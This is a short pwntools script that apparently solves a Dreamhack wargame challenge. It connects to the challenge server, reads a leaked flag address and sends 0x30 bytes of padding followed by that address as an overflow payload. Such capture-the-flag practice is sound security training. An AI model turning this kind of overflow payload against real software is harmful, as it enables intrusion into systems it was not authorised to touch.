from pwn import *

p=remote("host3.dreamhack.games", 11487)

p.recvuntil('real flag address (mmapped address):')

flag_addr = int(p.recvline().strip(), 16)
code = b'a' * 0x30
code += p64(flag_addr)

p.sendline(code)
print(p.recvline())
